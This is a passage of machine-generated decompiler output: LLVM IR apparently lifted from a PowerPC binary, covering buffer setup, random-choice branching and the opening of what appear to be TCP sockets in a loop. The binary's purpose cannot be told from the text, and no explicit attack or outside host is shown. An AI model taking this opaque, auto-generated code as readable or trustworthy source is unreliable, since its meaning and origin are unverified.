  %v1_1000047c = call i32 @function_1000a2ec(i32 41)
  store i32 42, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000488.15 to i32), i32* @lr, align 4
  %v1_10000484 = call i32 @function_1000a2ec(i32 42)
  store i32 43, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000490.16 to i32), i32* @lr, align 4
  %v1_1000048c = call i32 @function_1000a2ec(i32 43)
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10000498.17 to i32), i32* @lr, align 4
  %v1_10000494 = call i32 @function_1000a2ec(i32 44)
  store i32 45, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100004a0.18 to i32), i32* @lr, align 4
  %v1_1000049c = call i32 @function_1000a2ec(i32 45)
  store i32 46, i32* %r3.global-to-local, align 4
  store i32 268436648, i32* @lr, align 4
  %v1_100004a4 = call i32 @function_1000a2ec(i32 46)
  %v0_100004a8 = load i32, i32* %r21.global-to-local, align 4
  store i32 %v0_100004a8, i32* %r3.global-to-local, align 4
  store i32 3140, i32* %r4.global-to-local, align 4
  store i32 268436660, i32* @lr, align 4
  %v2_100004b0 = call i32 @function_1000c548(i32 %v0_100004a8, i32 3140)
  store i32 %v2_100004b0, i32* %r3.global-to-local, align 4
  %v1_100004b4 = load i32, i32* @r1, align 4
  %v2_100004b4 = add i32 %v1_100004b4, 20796
  %v3_100004b4 = inttoptr i32 %v2_100004b4 to i32*
  store i32 %v2_100004b0, i32* %v3_100004b4, align 4
  %v0_100004b8 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_100004b8 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_100004b8 = or i1 %v0_100004b8, %v1_100004b8
  br i1 %v2_100004b8, label %dec_label_pc_100005b4, label %dec_label_pc_100004bc

dec_label_pc_100004bc:                            ; preds = %dec_label_pc_1000043c
  store i32 %v2_100004b0, i32* @r31, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  store i32 268500992, i32* %r19.global-to-local, align 4
  br label %dec_label_pc_100004c8

dec_label_pc_100004c8:                            ; preds = %dec_label_pc_10001c70.dec_label_pc_100004c8_crit_edge, %dec_label_pc_100004bc
  %v2_100004d4 = phi i32 [ %v2_100004d4.pre, %dec_label_pc_10001c70.dec_label_pc_100004c8_crit_edge ], [ %v2_100004b0, %dec_label_pc_100004bc ]
  %v0_100004c8 = phi i32 [ %v1_10001c84, %dec_label_pc_10001c70.dec_label_pc_100004c8_crit_edge ], [ 0, %dec_label_pc_100004bc ]
  %v1_100004c8 = load i32, i32* %r23.global-to-local, align 4
  %v2_100004c8 = sdiv i32 %v0_100004c8, %v1_100004c8
  store i32 %v2_100004c8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 -1, i32* %r11.global-to-local, align 4
  %v3_100004d4 = add i32 %v2_100004d4, 4
  %v4_100004d4 = inttoptr i32 %v3_100004d4 to i8*
  store i8 0, i8* %v4_100004d4, align 1
  %v0_100004d8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100004d8 = load i32, i32* @r31, align 4
  %v2_100004d8 = inttoptr i32 %v1_100004d8 to i32*
  store i32 %v0_100004d8, i32* %v2_100004d8, align 4
  %v0_100004dc = load i32, i32* @r31, align 4
  %v1_100004dc = add i32 %v0_100004dc, 532
  store i32 %v1_100004dc, i32* %r24.global-to-local, align 4
  store i32 %v1_100004dc, i32* @r3, align 4
  %v0_100004e4 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_100004e4, i32* %r4.global-to-local, align 4
  %v0_100004e8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100004e8 = load i32, i32* %r23.global-to-local, align 4
  %v2_100004e8 = mul i32 %v1_100004e8, %v0_100004e8
  %v1_100004ec = load i32, i32* %r28.global-to-local, align 4
  %v2_100004ec = sub i32 %v1_100004ec, %v2_100004e8
  %v1_100004f0 = mul i32 %v2_100004ec, 24
  store i32 %v1_100004f0, i32* %r0.global-to-local, align 4
  %v1_100004f4 = load i32, i32* %r22.global-to-local, align 4
  %v2_100004f4 = add i32 %v1_100004f4, %v1_100004f0
  store i32 %v2_100004f4, i32* %r30.global-to-local, align 4
  %v1_100004f8 = add i32 %v2_100004f4, 16
  %v2_100004f8 = inttoptr i32 %v1_100004f8 to i32*
  %v3_100004f8 = load i32, i32* %v2_100004f8, align 4
  store i32 %v3_100004f8, i32* %r9.global-to-local, align 4
  %v2_100004fc = add i32 %v0_100004dc, 16
  %v3_100004fc = inttoptr i32 %v2_100004fc to i32*
  store i32 %v3_100004f8, i32* %v3_100004fc, align 4
  store i32 268436740, i32* %lr.global-to-local, align 4
  %v2_10000500 = inttoptr i32 %v1_100004dc to i8*
  %v3_10000500 = call i32 @function_1000ab8c(i8* %v2_10000500, i32 %v0_100004e4)
  store i32 %v3_10000500, i32* %r3.global-to-local, align 4
  %v0_10000504 = load i32, i32* @r31, align 4
  %v1_10000504 = add i32 %v0_10000504, 532
  %v2_10000504 = inttoptr i32 %v1_10000504 to i8*
  %v3_10000504 = load i8, i8* %v2_10000504, align 1
  %v4_10000504 = zext i8 %v3_10000504 to i32
  store i32 %v4_10000504, i32* %r0.global-to-local, align 4
  %v1_10000508 = icmp ult i8 %v3_10000504, 47
  %v2_10000508 = icmp ugt i8 %v3_10000504, 47
  %v3_10000508 = icmp eq i8 %v3_10000504, 47
  store i1 %v1_10000508, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000508, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000508, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000508, label %dec_label_pc_10000530, label %dec_label_pc_10000510

dec_label_pc_10000510:                            ; preds = %dec_label_pc_100004c8
  %v0_10000510 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000510, i32* %r3.global-to-local, align 4
  store i32 268436760, i32* @lr, align 4
  %v1_10000514 = inttoptr i32 %v0_10000510 to i8*
  %v2_10000514 = call i32 @function_1000ab64(i8* %v1_10000514)
  %v0_10000518 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000518, i32* %r4.global-to-local, align 4
  %v0_10000520 = load i32, i32* @r31, align 4
  %v1_10000520 = add i32 %v0_10000520, 533
  store i32 %v1_10000520, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000528.19 to i32), i32* @lr, align 4
  %v3_10000524 = call i32 @function_1000bbec(i32 %v1_10000520, i32 %v0_10000518, i32 %v2_10000514)
  store i32 %v3_10000524, i32* %r3.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v2_1000052c = load i32, i32* @r31, align 4
  %v3_1000052c = add i32 %v2_1000052c, 532
  %v4_1000052c = inttoptr i32 %v3_1000052c to i8*
  store i8 47, i8* %v4_1000052c, align 1
  %v0_10000534.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10000530

dec_label_pc_10000530:                            ; preds = %dec_label_pc_100004c8, %dec_label_pc_10000510
  %v0_10000534 = phi i32 [ %v0_10000504, %dec_label_pc_100004c8 ], [ %v0_10000534.pre, %dec_label_pc_10000510 ]
  %v0_10000530 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10000530, i32* %r4.global-to-local, align 4
  %v1_10000534 = add i32 %v0_10000534, 1440
  store i32 %v1_10000534, i32* @r3, align 4
  store i32 268436796, i32* %lr.global-to-local, align 4
  %v2_10000538 = inttoptr i32 %v1_10000534 to i8*
  %v3_10000538 = call i32 @function_1000ab8c(i8* %v2_10000538, i32 %v0_10000530)
  %v0_1000053c = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_1000053c, i32* %r4.global-to-local, align 4
  %v0_10000540 = load i32, i32* @r31, align 4
  %v1_10000540 = add i32 %v0_10000540, 1431
  store i32 %v1_10000540, i32* @r3, align 4
  store i32 268436808, i32* %lr.global-to-local, align 4
  %v2_10000544 = inttoptr i32 %v1_10000540 to i8*
  %v3_10000544 = call i32 @function_1000ab8c(i8* %v2_10000544, i32 %v0_1000053c)
  %v0_10000548 = load i32, i32* @r31, align 4
  %v1_10000548 = add i32 %v0_10000548, 789
  store i32 %v1_10000548, i32* @r3, align 4
  %v0_1000054c = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_1000054c, i32* %r4.global-to-local, align 4
  store i32 268436820, i32* %lr.global-to-local, align 4
  %v2_10000550 = inttoptr i32 %v1_10000548 to i8*
  %v3_10000550 = call i32 @function_1000ab8c(i8* %v2_10000550, i32 %v0_1000054c)
  store i32 %v3_10000550, i32* %r3.global-to-local, align 4
  %v0_10000554 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000554 = add i32 %v0_10000554, 20
  %v2_10000554 = inttoptr i32 %v1_10000554 to i8*
  %v3_10000554 = load i8, i8* %v2_10000554, align 1
  %v4_10000554 = zext i8 %v3_10000554 to i32
  store i32 %v4_10000554, i32* %r0.global-to-local, align 4
  %v1_10000558 = icmp ult i8 %v3_10000554, 31
  %v2_10000558 = icmp ugt i8 %v3_10000554, 31
  %v3_10000558 = icmp eq i8 %v3_10000554, 31
  store i1 %v1_10000558, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000558, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000558, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10000558, label %dec_label_pc_10000578, label %dec_label_pc_10000560

dec_label_pc_10000560:                            ; preds = %dec_label_pc_10000530
  %v1_10000560 = add i32 %v0_10000554, 16
  %v2_10000560 = inttoptr i32 %v1_10000560 to i32*
  %v3_10000560 = load i32, i32* %v2_10000560, align 4
  store i32 %v3_10000560, i32* %r29.global-to-local, align 4
  store i32 268436840, i32* %lr.global-to-local, align 4
  %v0_10000564 = call i32 @function_10007ca8()
  store i32 %v0_10000564, i32* %r3.global-to-local, align 4
  %v0_10000568 = load i32, i32* %r30.global-to-local, align 4
  %v1_10000568 = add i32 %v0_10000568, 20
  %v2_10000568 = inttoptr i32 %v1_10000568 to i8*
  %v3_10000568 = load i8, i8* %v2_10000568, align 1
  %v4_10000568 = zext i8 %v3_10000568 to i32
  store i32 %v4_10000568, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10000568, 64
  %v2_1000056c = zext i8 %tmp to i32
  %v3_1000056c = lshr i32 %v0_10000564, %v2_1000056c
  store i32 %v3_1000056c, i32* %r3.global-to-local, align 4
  %v0_10000570 = load i32, i32* %r29.global-to-local, align 4
  %v2_10000570 = add i32 %v3_1000056c, %v0_10000570
  store i32 %v2_10000570, i32* %r29.global-to-local, align 4
  %v1_10000574 = load i32, i32* @r31, align 4
  %v2_10000574 = add i32 %v1_10000574, 16
  %v3_10000574 = inttoptr i32 %v2_10000574 to i32*
  store i32 %v2_10000570, i32* %v3_10000574, align 4
  br label %dec_label_pc_10000578

dec_label_pc_10000578:                            ; preds = %dec_label_pc_10000530, %dec_label_pc_10000560
  store i32 ptrtoint (i32* @global_var_1000057c.20 to i32), i32* %lr.global-to-local, align 4
  %v0_10000578 = call i32 @function_10007ca8()
  %v1_10000578 = sext i32 %v0_10000578 to i64
  %v5_10000584 = mul nuw nsw i64 %v1_10000578, 3435973837
  %v1_100005881 = udiv i64 %v5_10000584, 17179869184
  %v1_10000588 = trunc i64 %v1_100005881 to i32
  %v1_1000058c = mul i32 %v1_10000588, 5
  store i32 %v1_1000058c, i32* %r0.global-to-local, align 4
  %v3_10000590 = sub i32 %v0_10000578, %v1_1000058c
  store i32 %v3_10000590, i32* %r3.global-to-local, align 4
  %v1_10000594 = icmp ult i32 %v3_10000590, 4
  %v2_10000594 = icmp ugt i32 %v3_10000590, 4
  %v3_10000594 = icmp eq i32 %v3_10000590, 4
  store i1 %v1_10000594, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000594, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000594, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10000594, label %dec_label_pc_10001c70, label %dec_label_pc_1000059c

dec_label_pc_1000059c:                            ; preds = %dec_label_pc_10000578
  store i32 ptrtoint (i32* @global_var_1000de88.21 to i32), i32* %r9.global-to-local, align 4
  %v1_100005a0 = mul i32 %v3_10000590, 4
  store i32 %v1_100005a0, i32* %r11.global-to-local, align 4
  %v2_100005a4 = add i32 %v1_100005a0, ptrtoint (i32* @global_var_1000de88.21 to i32)
  %v3_100005a4 = inttoptr i32 %v2_100005a4 to i32*
  %v4_100005a4 = load i32, i32* %v3_100005a4, align 4
  %v2_100005a8 = add i32 %v4_100005a4, ptrtoint (i32* @global_var_1000de88.21 to i32)
  store i32 %v2_100005a8, i32* %r0.global-to-local, align 4
  store i32 %v2_100005a8, i32* %ctr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v2_100005a8)
  br label %dec_label_pc_100005b4

dec_label_pc_100005b4:                            ; preds = %dec_label_pc_1000043c, %dec_label_pc_1000059c
  %v0_100005b4 = load i32, i32* @r1, align 4
  %v1_100005b4 = add i32 %v0_100005b4, 20804
  %v2_100005b4 = inttoptr i32 %v1_100005b4 to i32*
  %v3_100005b4 = load i32, i32* %v2_100005b4, align 4
  store i32 %v3_100005b4, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100005c4.preheader

dec_label_pc_100005c4.preheader:                  ; preds = %dec_label_pc_100005b4, %dec_label_pc_10001c8c
  %storemerge10.in = phi i32 [ %v0_100005b4, %dec_label_pc_100005b4 ], [ %v0_10001c8c, %dec_label_pc_10001c8c ]
  %storemerge9.in = phi i32 [ %v3_100005b4, %dec_label_pc_100005b4 ], [ %v3_10001c8c, %dec_label_pc_10001c8c ]
  %storemerge11 = add i32 %storemerge10.in, 8
  store i32 %storemerge11, i32* %r18.global-to-local, align 4
  %storemerge10 = add i32 %storemerge10.in, 300
  store i32 %storemerge10, i32* %r22.global-to-local, align 4
  %storemerge = icmp eq i32 %storemerge9.in, 0
  store i1 %storemerge, i1* %cr3_eq.global-to-local, align 1
  br label %dec_label_pc_100005c4

dec_label_pc_100005c4:                            ; preds = %dec_label_pc_1000079c, %dec_label_pc_10000794, %dec_label_pc_10000610, %dec_label_pc_10000824, %dec_label_pc_100005c4.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100005cc.22 to i32), i32* @lr, align 4
  %v0_100005c8 = call i32 @function_1000b7c0()
  store i32 %v0_100005c8, i32* %r3.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v0_100005c8, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 44, i32* %r11.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v2_100005e897 = load i32, i32* @r1, align 4
  %v3_100005e898 = add i32 %v2_100005e897, 44
  %v4_100005e899 = inttoptr i32 %v3_100005e898 to i32*
  store i32 0, i32* %v4_100005e899, align 4
  %v0_100005ec100 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100005ec101 = add i32 %v0_100005ec100, -1
  store i32 %v1_100005ec101, i32* %ctr.global-to-local, align 4
  %v2_100005ec102 = icmp eq i32 %v1_100005ec101, 0
  br i1 %v2_100005ec102, label %dec_label_pc_100005f0, label %dec_label_pc_100005e0.dec_label_pc_100005e0_crit_edge

dec_label_pc_100005e0.dec_label_pc_100005e0_crit_edge: ; preds = %dec_label_pc_100005c4, %dec_label_pc_100005e0.dec_label_pc_100005e0_crit_edge
  %v0_100005e0.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_100005e8.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_100005e0 = add i32 %v0_100005e0.pre, 44
  store i32 %v1_100005e0, i32* %r11.global-to-local, align 4
  %v1_100005e4 = add i32 %v0_100005e0.pre, 4
  store i32 %v1_100005e4, i32* %r9.global-to-local, align 4
  %v2_100005e8 = load i32, i32* @r1, align 4
  %v3_100005e8 = add i32 %v2_100005e8, %v1_100005e0
  %v4_100005e8 = inttoptr i32 %v3_100005e8 to i32*
  store i32 %v0_100005e8.pre, i32* %v4_100005e8, align 4
  %v0_100005ec = load i32, i32* %ctr.global-to-local, align 4
  %v1_100005ec = add i32 %v0_100005ec, -1
  store i32 %v1_100005ec, i32* %ctr.global-to-local, align 4
  %v2_100005ec = icmp eq i32 %v1_100005ec, 0
  br i1 %v2_100005ec, label %dec_label_pc_100005f0, label %dec_label_pc_100005e0.dec_label_pc_100005e0_crit_edge

dec_label_pc_100005f0:                            ; preds = %dec_label_pc_100005e0.dec_label_pc_100005e0_crit_edge, %dec_label_pc_100005c4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 172, i32* %r11.global-to-local, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v2_10000608103 = load i32, i32* @r1, align 4
  %v3_10000608104 = add i32 %v2_10000608103, 172
  %v4_10000608105 = inttoptr i32 %v3_10000608104 to i32*
  store i32 0, i32* %v4_10000608105, align 4
  %v0_1000060c106 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000060c107 = add i32 %v0_1000060c106, -1
  store i32 %v1_1000060c107, i32* %ctr.global-to-local, align 4
  %v2_1000060c108 = icmp eq i32 %v1_1000060c107, 0
  br i1 %v2_1000060c108, label %dec_label_pc_10000610, label %dec_label_pc_10000600.dec_label_pc_10000600_crit_edge

dec_label_pc_10000600.dec_label_pc_10000600_crit_edge: ; preds = %dec_label_pc_100005f0, %dec_label_pc_10000600.dec_label_pc_10000600_crit_edge
  %v0_10000600.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10000608.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_10000600 = add i32 %v0_10000600.pre, 172
  store i32 %v1_10000600, i32* %r11.global-to-local, align 4
  %v1_10000604 = add i32 %v0_10000600.pre, 4
  store i32 %v1_10000604, i32* %r9.global-to-local, align 4
  %v2_10000608 = load i32, i32* @r1, align 4
  %v3_10000608 = add i32 %v2_10000608, %v1_10000600
  %v4_10000608 = inttoptr i32 %v3_10000608 to i32*
  store i32 %v0_10000608.pre, i32* %v4_10000608, align 4
  %v0_1000060c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000060c = add i32 %v0_1000060c, -1
  store i32 %v1_1000060c, i32* %ctr.global-to-local, align 4
  %v2_1000060c = icmp eq i32 %v1_1000060c, 0
  br i1 %v2_1000060c, label %dec_label_pc_10000610, label %dec_label_pc_10000600.dec_label_pc_10000600_crit_edge

dec_label_pc_10000610:                            ; preds = %dec_label_pc_10000600.dec_label_pc_10000600_crit_edge, %dec_label_pc_100005f0
  %v0_10000610 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10000610 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10000610 = or i1 %v0_10000610, %v1_10000610
  br i1 %v2_10000610, label %dec_label_pc_100005c4, label %dec_label_pc_10000614

dec_label_pc_10000614:                            ; preds = %dec_label_pc_10000610
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 268500992, i32* %r11.global-to-local, align 4
  %v0_1000061c = load i32, i32* @r1, align 4
  %v1_1000061c = add i32 %v0_1000061c, 20796
  %v2_1000061c = inttoptr i32 %v1_1000061c to i32*
  %v3_1000061c = load i32, i32* %v2_1000061c, align 4
  store i32 %v3_1000061c, i32* %r30.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000de38.23 to i32), i32* %r16.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32), i32* %r24.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  store i32 1, i32* %r23.global-to-local, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* %r19.global-to-local, align 4
  br label %dec_label_pc_10000688

dec_label_pc_10000640:                            ; preds = %dec_label_pc_10000694
  %v2_10000640 = icmp ugt i8 %v3_10000688, 2
  %v3_10000640 = icmp eq i8 %v3_10000688, 2
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000640, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000640, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000640, label %dec_label_pc_10000c94, label %dec_label_pc_10000648

dec_label_pc_10000648:                            ; preds = %dec_label_pc_10000640
  %v1_10000648 = icmp ult i8 %v3_10000688, 4
  %v2_10000648 = icmp ugt i8 %v3_10000688, 4
  %v3_10000648 = icmp eq i8 %v3_10000688, 4
  store i1 %v1_10000648, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000648, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000648, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000648, label %dec_label_pc_100008b0, label %dec_label_pc_10000650

dec_label_pc_10000650:                            ; preds = %dec_label_pc_10000648
  %v1_10000650 = icmp ult i8 %v3_10000688, 6
  %v2_10000650 = icmp ugt i8 %v3_10000688, 6
  %v3_10000650 = icmp eq i8 %v3_10000688, 6
  store i1 %v1_10000650, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000650, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000650, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000650, label %dec_label_pc_10000c5c, label %dec_label_pc_10000658

dec_label_pc_10000658:                            ; preds = %dec_label_pc_10000650
  %v1_10000658 = icmp ult i8 %v3_10000688, 7
  %v2_10000658 = icmp ugt i8 %v3_10000688, 7
  %v3_10000658 = icmp eq i8 %v3_10000688, 7
  store i1 %v1_10000658, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000658, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000658, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000658, label %dec_label_pc_10000c5c, label %dec_label_pc_10000660

dec_label_pc_10000660:                            ; preds = %dec_label_pc_10000658
  %v1_10000660 = icmp ult i8 %v3_10000688, 10
  %v2_10000660 = icmp ugt i8 %v3_10000688, 10
  %v3_10000660 = icmp eq i8 %v3_10000688, 10
  store i1 %v1_10000660, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000660, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000660, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000660, label %dec_label_pc_10000c5c, label %dec_label_pc_10000668

dec_label_pc_10000668:                            ; preds = %dec_label_pc_10000c94, %dec_label_pc_10000660
  %v1_10000668 = inttoptr i32 %v2_10000c8c to i32*
  %v2_10000668 = load i32, i32* %v1_10000668, align 4
  store i32 %v2_10000668, i32* %r3.global-to-local, align 4
  %v0_1000066c = load i32, i32* %r17.global-to-local, align 4
  %v1_1000066c = trunc i32 %v0_1000066c to i8
  store i8 %v1_1000066c, i8* %v2_10000688, align 1
  store i32 268437108, i32* @lr, align 4
  %v0_10000670 = call i32 @function_1000b3f0()
  store i32 %v0_10000670, i32* %r3.global-to-local, align 4
  %v0_10000674 = load i32, i32* %r19.global-to-local, align 4
  %v1_10000674 = load i32, i32* %r30.global-to-local, align 4
  %v2_10000674 = inttoptr i32 %v1_10000674 to i32*
  store i32 %v0_10000674, i32* %v2_10000674, align 4
  br label %dec_label_pc_10000678

dec_label_pc_10000678:                            ; preds = %dec_label_pc_10000758, %dec_label_pc_10000c5c, %dec_label_pc_10000c00, %dec_label_pc_100006c0, %dec_label_pc_10000668
  %v0_10000678 = load i32, i32* %r28.global-to-local, align 4
  %v1_10000678 = add i32 %v0_10000678, 1
  store i32 %v1_10000678, i32* %r28.global-to-local, align 4
  %v0_1000067c = load i32, i32* %r30.global-to-local, align 4
  %v1_1000067c = add i32 %v0_1000067c, 3140
  store i32 %v1_1000067c, i32* %r30.global-to-local, align 4
  %v0_10000680 = load i32, i32* %r21.global-to-local, align 4
  %v2_10000680 = icmp slt i32 %v0_10000680, %v1_10000678
  %v3_10000680 = icmp sgt i32 %v0_10000680, %v1_10000678
  %v4_10000680 = icmp eq i32 %v0_10000680, %v1_10000678
  store i1 %v2_10000680, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10000680, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10000680, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10000680, label %dec_label_pc_10000678.dec_label_pc_10000794_crit_edge, label %dec_label_pc_10000688

dec_label_pc_10000678.dec_label_pc_10000794_crit_edge: ; preds = %dec_label_pc_10000678
  %v0_10000794.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10000794

dec_label_pc_10000688:                            ; preds = %dec_label_pc_10000784, %dec_label_pc_10000678, %dec_label_pc_10000614
  %v2_10000c8c = phi i32 [ %v3_1000061c, %dec_label_pc_10000614 ], [ %v1_1000067c, %dec_label_pc_10000678 ], [ %v1_10000788, %dec_label_pc_10000784 ]
  %v1_10000688 = add i32 %v2_10000c8c, 4
  %v2_10000688 = inttoptr i32 %v1_10000688 to i8*
  %v3_10000688 = load i8, i8* %v2_10000688, align 1
  %v4_10000688 = zext i8 %v3_10000688 to i32
  store i32 %v4_10000688, i32* %r0.global-to-local, align 4
  %v1_1000068c = icmp eq i8 %v3_10000688, 0
  %v2_1000068c = icmp ugt i8 %v3_10000688, 1
  %v3_1000068c = icmp eq i8 %v3_10000688, 1
  store i1 %v1_1000068c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_1000068c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_1000068c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000068c, label %dec_label_pc_1000089c, label %dec_label_pc_10000694

dec_label_pc_10000694:                            ; preds = %dec_label_pc_10000688
  %v2_10000694 = icmp ne i8 %v3_10000688, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000694, i1* %cr7_gt.global-to-local, align 1
  store i1 %v1_1000068c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_1000068c, label %dec_label_pc_1000069c, label %dec_label_pc_10000640

dec_label_pc_1000069c:                            ; preds = %dec_label_pc_10000694, %dec_label_pc_10000c8c
  %v0_1000069c = phi i32 [ %v2_10000c8c, %dec_label_pc_10000694 ], [ %v0_1000069c.pre, %dec_label_pc_10000c8c ]
  %v1_1000069c = inttoptr i32 %v0_1000069c to i32*
  %v2_1000069c = load i32, i32* %v1_1000069c, align 4
  store i32 %v2_1000069c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100006a4 = load i32, i32* @r1, align 4
  %v2_100006a4 = add i32 %v1_100006a4, 40
  %v3_100006a4 = inttoptr i32 %v2_100006a4 to i32*
  store i32 0, i32* %v3_100006a4, align 4
  %v0_100006a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100006a8 = icmp slt i32 %v0_100006a8, -1
  %v2_100006a8 = icmp sgt i32 %v0_100006a8, -1
  %v3_100006a8 = icmp eq i32 %v0_100006a8, -1
  store i1 %v1_100006a8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100006a8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100006a8, i1* %cr7_eq.global-to-local, align 1
  %v0_100006ac = load i32, i32* %r0.global-to-local, align 4
  %v1_100006ac = load i32, i32* @r1, align 4
  %v2_100006ac = add i32 %v1_100006ac, 28
  %v3_100006ac = inttoptr i32 %v2_100006ac to i32*
  store i32 %v0_100006ac, i32* %v3_100006ac, align 4
  %v0_100006b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100006b0 = load i32, i32* @r1, align 4
  %v2_100006b0 = add i32 %v1_100006b0, 32
  %v3_100006b0 = inttoptr i32 %v2_100006b0 to i32*
  store i32 %v0_100006b0, i32* %v3_100006b0, align 4
  %v0_100006b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100006b4 = load i32, i32* @r1, align 4
  %v2_100006b4 = add i32 %v1_100006b4, 36
  %v3_100006b4 = inttoptr i32 %v2_100006b4 to i32*
  store i32 %v0_100006b4, i32* %v3_100006b4, align 4
  br i1 %v3_100006a8, label %dec_label_pc_100006c0, label %dec_label_pc_100006bc

dec_label_pc_100006bc:                            ; preds = %dec_label_pc_1000069c
  store i32 ptrtoint ([3 x i8]* @global_var_100006c0.25 to i32), i32* @lr, align 4
  %v0_100006bc = call i32 @function_1000b3f0()
  store i32 %v0_100006bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100006c0

dec_label_pc_100006c0:                            ; preds = %dec_label_pc_1000069c, %dec_label_pc_100006bc
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  store i32 268437200, i32* @lr, align 4
  %v3_100006cc = call i32 @function_1000c1bc(i32 2, i32 1, i32 0)
  store i32 %v3_100006cc, i32* %r3.global-to-local, align 4
  %v1_100006d0 = icmp slt i32 %v3_100006cc, -1
  %v2_100006d0 = icmp sgt i32 %v3_100006cc, -1
  %v3_100006d0 = icmp eq i32 %v3_100006cc, -1
  store i1 %v1_100006d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_100006d0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_100006d0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_100006cc, i32* @r31, align 4
  %v1_100006d8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100006d8 = inttoptr i32 %v1_100006d8 to i32*
  store i32 %v3_100006cc, i32* %v2_100006d8, align 4
  br i1 %v3_100006d0, label %dec_label_pc_10000678, label %dec_label_pc_100006e0

dec_label_pc_100006e0:                            ; preds = %dec_label_pc_100006c0
  store i32 3, i32* @r4, align 4
  store i32 268437232, i32* @lr, align 4
  %v1_100006ec = call i32 @function_1000b2c0(i32 3)
